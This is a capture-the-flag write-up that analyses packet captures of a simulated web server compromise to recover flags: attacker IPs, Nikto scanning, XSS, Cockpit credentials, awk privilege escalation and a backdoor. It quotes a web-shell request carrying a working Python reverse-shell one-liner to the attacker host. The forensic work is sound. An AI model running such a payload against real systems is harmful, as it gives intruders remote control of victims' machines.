# Attack Investigation - Networks

## Challenge

This was a multi-part challenge which unlocked further stages as you completed them. For the sake of brevity I am recording them on a singular document under a singular title instead of creating unique ones for each challenge. 

## Solve:

This challenge was solved by our team MQCyberSec.

### Server & Attacker IP

Filtering for `http` traffic we can see evidence of web directory enumeration from `192.168.1.9` to `192.168.1.10`:

![nw1](https://github.com/user-attachments/assets/186d5fdd-6aea-431b-b774-6d337186c2dd)


`KCTF{192.168.1.10_192.168.1.9} `

### The Real Admin 

Filtering for `http` traffic which doesn't include the attackers IP, we can see admin activity from `192.168.1.3`:

![nw2](https://github.com/user-attachments/assets/77402dd8-9d9b-4433-bdce-6240b0d0cbe2)


`KCTF{192.168.1.3}`


### The Intruder's Identity

Filtering for POST requests from the attacker's IP, can find credentials used to register an account:

![n3](https://github.com/user-attachments/assets/9e59e0b7-2e36-4a5a-a7e0-9940bb3652ff)


`KCTF{theexploiter_exploiter@test}`

### Compromising the Admin

Same filters, can view multiple attempts to login to `admin` and find compromised credentials after final attempt:

![nw4](https://github.com/user-attachments/assets/fb6aec37-4d94-4cd3-b4d1-c8c7dc104e85)


`KCTF{theexploiter_exploiter@test}`

### Initial Reconnaisance

To explore the tools that may have been used, my teammate `Ch1maera` used `tshark` to enumerate `User-Agents`, and found:

`93e4r0-CVE-2014-6271`

Doing a search for "93e4r0-CVE-2014-6271" led to the GitHub repo for `nikto`, a web enumeration tool.

The `User-Agent` can be found with this command:

```
./tshark.exe -r capture1.pcapng -Y "http.user_agent" -T fields -e http.user_agent | Sort-Object | Get-Unique
```

![nw5](https://github.com/user-attachments/assets/e1fb63f8-3726-4b73-93ba-a24e1b296c46)


`KCTF{nikto}`

### Stealing the Sweet

Found evidence of an XSS attack under Statistics->HTTP->Requests:

![nw6](https://github.com/user-attachments/assets/efff728c-5c54-45fb-bdf3-e5d4012a4339)


Filtering for `http` traffic that is not destined for port 80 (credit to my teammate `sealldev`) we can see HTTP packets sent from the server to the attackers IP:

![nw7](https://github.com/user-attachments/assets/f2d41ecb-c191-4f0b-8263-548f0214c2a5)


`KCTF{8881_xss}`

### The Overseer

Moving on to the second packet capture, the first batch of packets show requests to `/cockpit`:

![nw8](https://github.com/user-attachments/assets/53fb0a84-b0ce-48c5-8f67-09013721efa3)


`KCTF{cockpit}`

### The Gatekeeper

To find out the port the server listens on, just check the GET request to `/cockpit/login` above.

`KCTF{9090}`

### The Server's Identity 

Viewing the WebSocket traffic we can see the `host` in the attackers communication with the server is specified as `localhost`:

![nw9](https://github.com/user-attachments/assets/74c82661-4d90-478b-b34c-3cf6170ad639)


`KCTF{localhost.localdomain}`

### Tareq's Secret 

To find the password, filter for `http` requests to `/cockpit/login` and view last (and successful) login attempt:

![nw10](https://github.com/user-attachments/assets/0f02c211-d4c5-43cb-a424-9323b5f286b7)


`KCTF{SecurePass}`

### The Escalation Trick

Moving on to the third and final packet capture, we can filter for `http` requests and sort by length to view commands requested as URIs:

![nw11](https://github.com/user-attachments/assets/3f33caa7-49a2-4203-bb12-8f4b2cbda9a8)


```
 GET /uploads/678e2443a6725.php?cmd=export%20RHOST=%22192.168.1.9%22;export%20RPORT=5074;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27 HTTP/1.1
```

The command appears to be establishing a reverse shell. Following the tcp stream (credit to `sealldev`) shows attacker executing commands through this shell and reveals the tool used to escalate privileges:

![nw12](https://github.com/user-attachments/assets/adf85837-94a4-43a8-97f4-08c4ceb43775)


`KCTF{awk}`

### The Hidden Door

In the same TCP stream, we can view the commands executed by the attacker to establish a backdoor:

![nw13](https://github.com/user-attachments/assets/c9663e64-f7e6-42fe-a2f5-252497ad9828)

The attacker changes to the `root` directory, creates a hidden directory `.sys` and installs the backdoor via `wget` on port 2081.

`KCTF{/root/.sys/sys_2081}`

### Port Fiesta

In the same TCP stream, we can see the server is started on 10 different ports:

![nw14](https://github.com/user-attachments/assets/8667e2b3-2c82-45df-8095-09b36bccfd1e)


`KCTF{10}`

### The Backdoor's Whisper

Manually checking the ports from the previous question with `tcp.port == <port>`, only port 12345 has any activity:

`KCTF{12345}`

### The Unused Tool 

### Malicious Uploads 

### Shell History
